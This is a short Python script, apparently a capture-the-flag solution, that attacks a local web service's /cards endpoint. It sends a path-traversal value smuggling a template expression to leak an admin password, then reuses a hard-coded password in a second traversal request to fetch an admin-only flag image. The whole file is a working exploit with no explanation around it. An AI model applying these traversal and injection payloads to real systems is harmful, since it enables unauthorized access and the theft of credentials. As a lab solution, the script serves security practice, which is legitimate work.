from requests import post
url='http://127.0.0.1:1337'

r=post(f'{url}/cards', data= {'image': '../../custom-cards?image=green.png&wish={{ADMINPASS}}&dummy=.png'}).content
open('card.png', 'wb').write(r)

# PASS = input('Pass>')
PASS = 'GOD_INTERN!'

r = post(f'{url}/cards', data= {'image': f'../../admin-card?pass={PASS}&dummy=.png'}).content

open('flag.png', 'wb').write(r)

